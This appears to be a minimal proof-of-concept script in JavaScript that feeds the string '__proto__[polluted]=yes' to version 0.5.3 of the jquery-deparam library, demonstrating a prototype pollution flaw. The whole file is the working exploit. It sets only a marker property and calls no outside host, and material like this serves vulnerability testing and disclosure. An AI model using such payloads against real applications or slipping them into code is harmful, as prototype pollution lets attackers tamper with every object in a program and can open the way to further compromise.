const deparam = require('./jquery-deparam@0.5.3')
var payload = '__proto__[polluted]=yes'
deparam(payload)
